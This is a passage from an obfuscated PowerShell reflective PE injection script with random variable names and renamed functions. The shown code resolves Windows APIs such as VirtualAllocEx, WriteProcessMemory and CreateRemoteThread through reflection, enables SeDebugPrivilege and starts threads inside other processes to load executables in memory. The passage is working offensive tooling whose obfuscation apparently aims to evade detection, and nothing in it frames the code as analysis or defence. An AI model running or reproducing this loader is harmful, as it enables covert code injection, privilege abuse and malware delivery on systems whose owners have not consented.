		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_WRITE -Value 0x80000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_SCN_MEM_NOT_CACHED -Value 0x04000000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_DECOMMIT -Value 0x4000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_EXECUTABLE_IMAGE -Value 0x0002
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_FILE_DLL -Value 0x2000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE -Value 0x40
		$Win32Constants | Add-Member -MemberType NoteProperty -Name IMAGE_DLLCHARACTERISTICS_NX_COMPAT -Value 0x100
		$Win32Constants | Add-Member -MemberType NoteProperty -Name MEM_RELEASE -Value 0x8000
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_QUERY -Value 0x0008
		$Win32Constants | Add-Member -MemberType NoteProperty -Name TOKEN_ADJUST_PRIVILEGES -Value 0x0020
		$Win32Constants | Add-Member -MemberType NoteProperty -Name SE_PRIVILEGE_ENABLED -Value 0x2
		$Win32Constants | Add-Member -MemberType NoteProperty -Name ERROR_NO_TOKEN -Value 0x3f0
		
		return $Win32Constants
	}
	Function sneaks
	{
		$HDWlOjKv99 = New-Object System.Object
		
		$FwHmVhId99 = Pd kernel32.dll VirtualAlloc
		$mukDNJYS99 = serpent @([IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$PUEGSajZ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($FwHmVhId99, $mukDNJYS99)
		$HDWlOjKv99 | Add-Member NoteProperty -Name VirtualAlloc -Value $PUEGSajZ99
		
		$ZgukDhzy99 = Pd kernel32.dll VirtualAllocEx
		$VirPNsDa99 = serpent @([IntPtr], [IntPtr], [UIntPtr], [UInt32], [UInt32]) ([IntPtr])
		$aDZinfuL99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ZgukDhzy99, $VirPNsDa99)
		$HDWlOjKv99 | Add-Member NoteProperty -Name VirtualAllocEx -Value $aDZinfuL99
		
		$BnxReysE99 = Pd msvcrt.dll memcpy
		$gITowIKK99 = serpent @([IntPtr], [IntPtr], [UIntPtr]) ([IntPtr])
		$tnVerxld99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($BnxReysE99, $gITowIKK99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name memcpy -Value $tnVerxld99
		
		$SCSodqni99 = Pd msvcrt.dll memset
		$fUYdDOAw99 = serpent @([IntPtr], [Int32], [IntPtr]) ([IntPtr])
		$DfdJHtKV99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($SCSodqni99, $fUYdDOAw99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name memset -Value $DfdJHtKV99
		
		$WWswQnEY99 = Pd kernel32.dll LoadLibraryA
		$OOWsgmRW99 = serpent @([String]) ([IntPtr])
		$xoNeIIhI99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WWswQnEY99, $OOWsgmRW99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name LoadLibrary -Value $xoNeIIhI99
		
		$ORjxNcai99 = Pd kernel32.dll GetProcAddress
		$VjUVNlUV99 = serpent @([IntPtr], [String]) ([IntPtr])
		$ymiAxgnW99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ORjxNcai99, $VjUVNlUV99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name GetProcAddress -Value $ymiAxgnW99
		
		$vGChrLnL99 = Pd kernel32.dll GetProcAddress
		$HIoAOaYS99 = serpent @([IntPtr], [IntPtr]) ([IntPtr])
		$JmgmJkYM99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vGChrLnL99, $HIoAOaYS99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name GetProcAddressOrdinal -Value $JmgmJkYM99
		
		$vnLfyFfL99 = Pd kernel32.dll VirtualFree
		$oKcouvHR99 = serpent @([IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$xdZaMfRh99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($vnLfyFfL99, $oKcouvHR99)
		$HDWlOjKv99 | Add-Member NoteProperty -Name VirtualFree -Value $xdZaMfRh99
		
		$IMhjsZnJ99 = Pd kernel32.dll VirtualFreeEx
		$YFWUqcuc99 = serpent @([IntPtr], [IntPtr], [UIntPtr], [UInt32]) ([Bool])
		$yKBFXgJS99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($IMhjsZnJ99, $YFWUqcuc99)
		$HDWlOjKv99 | Add-Member NoteProperty -Name VirtualFreeEx -Value $yKBFXgJS99
		
		$NDATwLCy99 = Pd kernel32.dll VirtualProtect
		$QSVDPbeM99 = serpent @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
		$wFFtoHPd99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($NDATwLCy99, $QSVDPbeM99)
		$HDWlOjKv99 | Add-Member NoteProperty -Name VirtualProtect -Value $wFFtoHPd99
		
		$usXxSqzt99 = Pd kernel32.dll GetModuleHandleA
		$bthijSaU99 = serpent @([String]) ([IntPtr])
		$MDvQyydV99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($usXxSqzt99, $bthijSaU99)
		$HDWlOjKv99 | Add-Member NoteProperty -Name GetModuleHandle -Value $MDvQyydV99
		
		$RPApzZZR99 = Pd kernel32.dll FreeLibrary
		$ouPNqeuR99 = serpent @([Bool]) ([IntPtr])
		$QvyDOEkn99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($RPApzZZR99, $ouPNqeuR99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name FreeLibrary -Value $QvyDOEkn99
		
		$ktQEdIuk99 = Pd kernel32.dll OpenProcess
	    $GKzFIuNY99 = serpent @([UInt32], [Bool], [UInt32]) ([IntPtr])
	    $YQYygmng99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ktQEdIuk99, $GKzFIuNY99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name OpenProcess -Value $YQYygmng99
		
		$bamtYBvI99 = Pd kernel32.dll WaitForSingleObject
	    $vuQIhiHl99 = serpent @([IntPtr], [UInt32]) ([UInt32])
	    $TskGwZdB99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($bamtYBvI99, $vuQIhiHl99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name WaitForSingleObject -Value $TskGwZdB99
		
		$lNOmFSiR99 = Pd kernel32.dll WriteProcessMemory
        $vhAJSOhw99 = serpent @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $RbqOTTCq99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($lNOmFSiR99, $vhAJSOhw99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name WriteProcessMemory -Value $RbqOTTCq99
		
		$npMxfrzQ99 = Pd kernel32.dll ReadProcessMemory
        $PGGEjsGI99 = serpent @([IntPtr], [IntPtr], [IntPtr], [UIntPtr], [UIntPtr].MakeByRefType()) ([Bool])
        $fjvEaAWh99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($npMxfrzQ99, $PGGEjsGI99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name ReadProcessMemory -Value $fjvEaAWh99
		
		$uHqnGVFi99 = Pd kernel32.dll CreateRemoteThread
        $rowTVZvE99 = serpent @([IntPtr], [IntPtr], [UIntPtr], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $VygWbGMe99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($uHqnGVFi99, $rowTVZvE99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name CreateRemoteThread -Value $VygWbGMe99
		
		$PdCdZLDm99 = Pd kernel32.dll GetExitCodeThread
        $YiGYiyOt99 = serpent @([IntPtr], [Int32].MakeByRefType()) ([Bool])
        $WVOiGOiq99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($PdCdZLDm99, $YiGYiyOt99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name GetExitCodeThread -Value $WVOiGOiq99
		
		$ZBWOaMiE99 = Pd Advapi32.dll OpenThreadToken
        $JnHRBTJA99 = serpent @([IntPtr], [UInt32], [Bool], [IntPtr].MakeByRefType()) ([Bool])
        $lXBzfYyW99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($ZBWOaMiE99, $JnHRBTJA99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name OpenThreadToken -Value $lXBzfYyW99
		
		$HAvcPbfF99 = Pd kernel32.dll GetCurrentThread
        $bZZkfGER99 = serpent @() ([IntPtr])
        $KxvZGnLI99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($HAvcPbfF99, $bZZkfGER99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name GetCurrentThread -Value $KxvZGnLI99
		
		$zMTfVtTw99 = Pd Advapi32.dll AdjustTokenPrivileges
        $jdGwgbTD99 = serpent @([IntPtr], [Bool], [IntPtr], [UInt32], [IntPtr], [IntPtr]) ([Bool])
        $JqDFbKSa99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($zMTfVtTw99, $jdGwgbTD99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name AdjustTokenPrivileges -Value $JqDFbKSa99
		
		$KIPBkJFT99 = Pd Advapi32.dll LookupPrivilegeValueA
        $iQxieVKO99 = serpent @([String], [String], [IntPtr]) ([Bool])
        $kpOgAENx99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($KIPBkJFT99, $iQxieVKO99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name LookupPrivilegeValue -Value $kpOgAENx99
		
		$DDINlUOo99 = Pd Advapi32.dll ImpersonateSelf
        $tfWwNKFh99 = serpent @([Int32]) ([Bool])
        $PMotfXkS99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($DDINlUOo99, $tfWwNKFh99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name ImpersonateSelf -Value $PMotfXkS99
		
        if (([Environment]::OSVersion.Version -ge (New-Object 'Version' 6,0)) -and ([Environment]::OSVersion.Version -lt (New-Object 'Version' 6,2))) {
		    $frNiljtG99 = Pd NtDll.dll NtCreateThreadEx
            $eJmfMSlR99 = serpent @([IntPtr].MakeByRefType(), [UInt32], [IntPtr], [IntPtr], [IntPtr], [IntPtr], [Bool], [UInt32], [UInt32], [UInt32], [IntPtr]) ([UInt32])
            $SOWmgycQ99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($frNiljtG99, $eJmfMSlR99)
		    $HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name NtCreateThreadEx -Value $SOWmgycQ99
        }
		
		$HyxczpYh99 = Pd Kernel32.dll IsWow64Process
        $ZzVMZAKZ99 = serpent @([IntPtr], [Bool].MakeByRefType()) ([Bool])
        $iwLDSuCV99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($HyxczpYh99, $ZzVMZAKZ99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name IsWow64Process -Value $iwLDSuCV99
		
		$fyhUrbvU99 = Pd Kernel32.dll CreateThread
        $iCCzElMu99 = serpent @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [UInt32], [UInt32].MakeByRefType()) ([IntPtr])
        $UWtvYocd99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($fyhUrbvU99, $iCCzElMu99)
		$HDWlOjKv99 | Add-Member -MemberType NoteProperty -Name CreateThread -Value $UWtvYocd99
	
		$heuwjeCA99 = Pd kernel32.dll VirtualFree
		$plvPvtRH99 = serpent @([IntPtr])
		$EipPepQg99 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($heuwjeCA99, $plvPvtRH99)
		$HDWlOjKv99 | Add-Member NoteProperty -Name LocalFree -Value $EipPepQg99
		return $HDWlOjKv99
	}
			
	Function veracious
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$PnDuFWin99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$EwtnHeqJ99
		)
		
		[Byte[]]$IhkdUyDX99 = [BitConverter]::GetBytes($PnDuFWin99)
		[Byte[]]$YWzDaolt99 = [BitConverter]::GetBytes($EwtnHeqJ99)
		[Byte[]]$iFJWyiif99 = [BitConverter]::GetBytes([UInt64]0)
		if ($IhkdUyDX99.Count -eq $YWzDaolt99.Count)
		{
			$HcvpTVCs99 = 0
			for ($i = 0; $i -lt $IhkdUyDX99.Count; $i++)
			{
				$Val = $IhkdUyDX99[$i] - $HcvpTVCs99
				if ($Val -lt $YWzDaolt99[$i])
				{
					$Val += 256
					$HcvpTVCs99 = 1
				}
				else
				{
					$HcvpTVCs99 = 0
				}
				
				
				[UInt16]$Sum = $Val - $YWzDaolt99[$i]
				$iFJWyiif99[$i] = $Sum -band 0x00FF
			}
		}
		else
		{
			Throw "Cannot subtract bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($iFJWyiif99, 0)
	}
	
	Function sane
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$PnDuFWin99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$EwtnHeqJ99
		)
		
		[Byte[]]$IhkdUyDX99 = [BitConverter]::GetBytes($PnDuFWin99)
		[Byte[]]$YWzDaolt99 = [BitConverter]::GetBytes($EwtnHeqJ99)
		[Byte[]]$iFJWyiif99 = [BitConverter]::GetBytes([UInt64]0)
		if ($IhkdUyDX99.Count -eq $YWzDaolt99.Count)
		{
			$HcvpTVCs99 = 0
			for ($i = 0; $i -lt $IhkdUyDX99.Count; $i++)
			{
				[UInt16]$Sum = $IhkdUyDX99[$i] + $YWzDaolt99[$i] + $HcvpTVCs99
				$iFJWyiif99[$i] = $Sum -band 0x00FF
				
				if (($Sum -band 0xFF00) -eq 0x100)
				{
					$HcvpTVCs99 = 1
				}
				else
				{
					$HcvpTVCs99 = 0
				}
			}
		}
		else
		{
			Throw "Cannot add bytearrays of different sizes"
		}
		
		return [BitConverter]::ToInt64($iFJWyiif99, 0)
	}
	
	Function penologists
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[Int64]
		$PnDuFWin99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		$EwtnHeqJ99
		)
		
		[Byte[]]$IhkdUyDX99 = [BitConverter]::GetBytes($PnDuFWin99)
		[Byte[]]$YWzDaolt99 = [BitConverter]::GetBytes($EwtnHeqJ99)
		if ($IhkdUyDX99.Count -eq $YWzDaolt99.Count)
		{
			for ($i = $IhkdUyDX99.Count-1; $i -ge 0; $i--)
			{
				if ($IhkdUyDX99[$i] -gt $YWzDaolt99[$i])
				{
					return $true
				}
				elseif ($IhkdUyDX99[$i] -lt $YWzDaolt99[$i])
				{
					return $false
				}
			}
		}
		else
		{
			Throw "Cannot compare byte arrays of different size"
		}
		
		return $false
	}
	
	Function politer
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt64]
		$Value
		)
		
		[Byte[]]$TxVTQrnv99 = [BitConverter]::GetBytes($Value)
		return ([BitConverter]::ToInt64($TxVTQrnv99, 0))
	}
	
	
	Function chirped
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[String]
		$JsYGPiYm99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$PEInfo,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(ParameterSetName = "Size", Position = 3, Mandatory = $true)]
		[IntPtr]
		$Size
		)
		
	    [IntPtr]$DRfCdeWZ99 = [IntPtr](sane ($StartAddress) ($Size))
		
		$ikDilHpd99 = $PEInfo.EndAddress
		
		if ((penologists ($PEInfo.PEHandle) ($StartAddress)) -eq $true)
		{
			Throw "Trying to write to memory smaller than allocated address range. $JsYGPiYm99"
		}
		if ((penologists ($DRfCdeWZ99) ($ikDilHpd99)) -eq $true)
		{
			Throw "Trying to write to memory greater than allocated address range. $JsYGPiYm99"
		}
	}
	
	
	Function uninteresting
	{
		Param(
			[Parameter(Position=0, Mandatory = $true)]
			[Byte[]]
			$Bytes,
			
			[Parameter(Position=1, Mandatory = $true)]
			[IntPtr]
			$xOESEpLd99
		)
	
		for ($jhsNkFcA99 = 0; $jhsNkFcA99 -lt $Bytes.Length; $jhsNkFcA99++)
		{
			[System.Runtime.InteropServices.Marshal]::WriteByte($xOESEpLd99, $jhsNkFcA99, $Bytes[$jhsNkFcA99])
		}
	}
	
	Function serpent
	{
	    Param
	    (
	        [OutputType([Type])]
	        
	        [Parameter( Position = 0)]
	        [Type[]]
	        $aZBByMFl99 = (New-Object Type[](0)),
	        
	        [Parameter( Position = 1 )]
	        [Type]
	        $ReturnType = [Void]
	    )
	    $oJRHPqWW99 = [AppDomain]::CurrentDomain
	    $orsKGPwx99 = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
	    $NtQekUya99 = $oJRHPqWW99.DefineDynamicAssembly($orsKGPwx99, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
	    $nPkixAJP99 = $NtQekUya99.DefineDynamicModule('InMemoryModule', $false)
	    $seOzsThy99 = $nPkixAJP99.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
	    $frtsOGll99 = $seOzsThy99.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $aZBByMFl99)
	    $frtsOGll99.SetImplementationFlags('Runtime, Managed')
	    $OUugzOGF99 = $seOzsThy99.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $aZBByMFl99)
	    $OUugzOGF99.SetImplementationFlags('Runtime, Managed')
	    
	    Write-Output $seOzsThy99.CreateType()
	}
	Function Pd
	{
	    Param
	    (
	        [OutputType([IntPtr])]
	    
	        [Parameter( Position = 0, Mandatory = $True )]
	        [String]
	        $Module,
	        
	        [Parameter( Position = 1, Mandatory = $True )]
	        [String]
	        $BGeLTnTi99
	    )
	    $xVNgTMpn99 = [AppDomain]::CurrentDomain.GetAssemblies() |
	        Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
	    $lJISeMoG99 = $xVNgTMpn99.GetType('Microsoft.Win32.UnsafeNativeMethods')
	    $MDvQyydV99 = $lJISeMoG99.GetMethod('GetModuleHandle')
        $ymiAxgnW99 = $lJISeMoG99.GetMethod('GetProcAddress',[Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
	    $bVMCEbhh99 = $MDvQyydV99.Invoke($null, @($Module))
	    $YkkNDIzB99 = New-Object IntPtr
	    $VVSAGJjg99 = New-Object System.Runtime.InteropServices.HandleRef($YkkNDIzB99, $bVMCEbhh99)
	    Write-Output $ymiAxgnW99.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$VVSAGJjg99, $BGeLTnTi99))
	}
	
	
	Function garrulity
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$HDWlOjKv99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$LJGBrAPz99,
		
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		[IntPtr]$utdCgmzN99 = $HDWlOjKv99.GetCurrentThread.Invoke()
		if ($utdCgmzN99 -eq [IntPtr]::Zero)
		{
			Throw "Unable to get the handle to the current thread"
		}
		
		[IntPtr]$TTJDEoWC99 = [IntPtr]::Zero
		[Bool]$RdmPlRRb99 = $HDWlOjKv99.OpenThreadToken.Invoke($utdCgmzN99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$TTJDEoWC99)
		if ($RdmPlRRb99 -eq $false)
		{
			$AzBHSLMQ99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($AzBHSLMQ99 -eq $Win32Constants.ERROR_NO_TOKEN)
			{
				$RdmPlRRb99 = $HDWlOjKv99.ImpersonateSelf.Invoke(3)
				if ($RdmPlRRb99 -eq $false)
				{
					Throw "Unable to impersonate self"
				}
				
				$RdmPlRRb99 = $HDWlOjKv99.OpenThreadToken.Invoke($utdCgmzN99, $Win32Constants.TOKEN_QUERY -bor $Win32Constants.TOKEN_ADJUST_PRIVILEGES, $false, [Ref]$TTJDEoWC99)
				if ($RdmPlRRb99 -eq $false)
				{
					Throw "Unable to OpenThreadToken."
				}
			}
			else
			{
				Throw "Unable to OpenThreadToken. Error code: $AzBHSLMQ99"
			}
		}
		
		[IntPtr]$PLuid = [System.Runtime.InteropServices.Marshal]::AllocHGlobal([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LJGBrAPz99.LUID))
		$RdmPlRRb99 = $HDWlOjKv99.LookupPrivilegeValue.Invoke($null, "SeDebugPrivilege", $PLuid)
		if ($RdmPlRRb99 -eq $false)
		{
			Throw "Unable to call LookupPrivilegeValue"
		}
		[UInt32]$tBINlgqi99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LJGBrAPz99.TOKEN_PRIVILEGES)
		[IntPtr]$TlwlVQpM99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($tBINlgqi99)
		$eKshUvFC99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TlwlVQpM99, [Type]$LJGBrAPz99.TOKEN_PRIVILEGES)
		$eKshUvFC99.PrivilegeCount = 1
		$eKshUvFC99.Privileges.Luid = [System.Runtime.InteropServices.Marshal]::PtrToStructure($PLuid, [Type]$LJGBrAPz99.LUID)
		$eKshUvFC99.Privileges.Attributes = $Win32Constants.SE_PRIVILEGE_ENABLED
		[System.Runtime.InteropServices.Marshal]::StructureToPtr($eKshUvFC99, $TlwlVQpM99, $true)
		$RdmPlRRb99 = $HDWlOjKv99.AdjustTokenPrivileges.Invoke($TTJDEoWC99, $false, $TlwlVQpM99, $tBINlgqi99, [IntPtr]::Zero, [IntPtr]::Zero)
		$AzBHSLMQ99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error() #Need this to get success value or failure value
		if (($RdmPlRRb99 -eq $false) -or ($AzBHSLMQ99 -ne 0))
		{
		}
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($TlwlVQpM99)
	}
	
	
	Function braziers
	{
		Param(
		[Parameter(Position = 1, Mandatory = $true)]
		[IntPtr]
		$qXvylkCO99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[IntPtr]
		$StartAddress,
		
		[Parameter(Position = 3, Mandatory = $false)]
		[IntPtr]
		$wSzHRtVc99 = [IntPtr]::Zero,
		
		[Parameter(Position = 4, Mandatory = $true)]
		[System.Object]
		$HDWlOjKv99
		)
		
		[IntPtr]$xbEcQjMH99 = [IntPtr]::Zero
		
		$EEGgYuem99 = [Environment]::OSVersion.Version
		if (($EEGgYuem99 -ge (New-Object 'Version' 6,0)) -and ($EEGgYuem99 -lt (New-Object 'Version' 6,2)))
		{
			Write-Verbose "Windows Vista/7 detected, using NtCreateThreadEx. Address of thread: $StartAddress"
			$fouhfFGG99= $HDWlOjKv99.NtCreateThreadEx.Invoke([Ref]$xbEcQjMH99, 0x1FFFFF, [IntPtr]::Zero, $qXvylkCO99, $StartAddress, $wSzHRtVc99, $false, 0, 0xffff, 0xffff, [IntPtr]::Zero)
			$KETcreZL99 = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
			if ($xbEcQjMH99 -eq [IntPtr]::Zero)
			{
				Throw "Error in NtCreateThreadEx. Return value: $fouhfFGG99. LastError: $KETcreZL99"
			}
		}
		else
		{
			Write-Verbose "Windows XP/8 detected, using CreateRemoteThread. Address of thread: $StartAddress"
			$xbEcQjMH99 = $HDWlOjKv99.CreateRemoteThread.Invoke($qXvylkCO99, [IntPtr]::Zero, [UIntPtr][UInt64]0xFFFF, $StartAddress, $wSzHRtVc99, 0, [IntPtr]::Zero)
		}
		
		if ($xbEcQjMH99 -eq [IntPtr]::Zero)
		{
			Write-Verbose "Error creating remote thread, thread handle is null"
		}
		
		return $xbEcQjMH99
	}
	
	Function sum
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[IntPtr]
		$egdOmrAe99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$LJGBrAPz99
		)
		
		$RZehjWou99 = New-Object System.Object
		
		$xmxvblfE99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($egdOmrAe99, [Type]$LJGBrAPz99.IMAGE_DOS_HEADER)
		[IntPtr]$gBbShFMR99 = [IntPtr](sane ([Int64]$egdOmrAe99) ([Int64][UInt64]$xmxvblfE99.e_lfanew))
		$RZehjWou99 | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value $gBbShFMR99
		$rLByWXLJ99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($gBbShFMR99, [Type]$LJGBrAPz99.IMAGE_NT_HEADERS64)
		
	    if ($rLByWXLJ99.Signature -ne 0x00004550)
	    {
	        throw "Invalid IMAGE_NT_HEADER signature."
	    }
		
		if ($rLByWXLJ99.OptionalHeader.Magic -eq 'IMAGE_NT_OPTIONAL_HDR64_MAGIC')
		{
			$RZehjWou99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $rLByWXLJ99
			$RZehjWou99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $true
		}
		else
		{
			$xoZdhrcX99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($gBbShFMR99, [Type]$LJGBrAPz99.IMAGE_NT_HEADERS32)
			$RZehjWou99 | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value $xoZdhrcX99
			$RZehjWou99 | Add-Member -MemberType NoteProperty -Name PE64Bit -Value $false
		}
		
		return $RZehjWou99
	}
	Function backslidden
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true )]
		[Byte[]]
		$GPmJoDbZ99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$LJGBrAPz99
		)
		
		$PEInfo = New-Object System.Object
		
		[IntPtr]$QdDlOlzx99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($GPmJoDbZ99.Length)
		[System.Runtime.InteropServices.Marshal]::Copy($GPmJoDbZ99, 0, $QdDlOlzx99, $GPmJoDbZ99.Length) | Out-Null
		
		$RZehjWou99 = sum -egdOmrAe99 $QdDlOlzx99 -LJGBrAPz99 $LJGBrAPz99
		
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'PE64Bit' -Value ($RZehjWou99.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'OriginalImageBase' -Value ($RZehjWou99.IMAGE_NT_HEADERS.OptionalHeader.ImageBase)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($RZehjWou99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfHeaders' -Value ($RZehjWou99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfHeaders)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'DllCharacteristics' -Value ($RZehjWou99.IMAGE_NT_HEADERS.OptionalHeader.DllCharacteristics)
		
		[System.Runtime.InteropServices.Marshal]::FreeHGlobal($QdDlOlzx99)
		
		return $PEInfo
	}
	Function backslid
	{
		Param(
		[Parameter( Position = 0, Mandatory = $true)]
		[IntPtr]
		$egdOmrAe99,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$LJGBrAPz99,
		
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Constants
		)
		
		if ($egdOmrAe99 -eq $null -or $egdOmrAe99 -eq [IntPtr]::Zero)
		{
			throw 'PEHandle is null or IntPtr.Zero'
		}
		
		$PEInfo = New-Object System.Object
		
		$RZehjWou99 = sum -egdOmrAe99 $egdOmrAe99 -LJGBrAPz99 $LJGBrAPz99
		
		$PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $egdOmrAe99
		$PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($RZehjWou99.IMAGE_NT_HEADERS)
		$PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($RZehjWou99.NtHeadersPtr)
		$PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($RZehjWou99.PE64Bit)
		$PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($RZehjWou99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
		
		if ($PEInfo.PE64Bit -eq $true)
		{
			[IntPtr]$PjRLYAcH99 = [IntPtr](sane ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$LJGBrAPz99.IMAGE_NT_HEADERS64)))
			$PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $PjRLYAcH99
		}
		else
		{
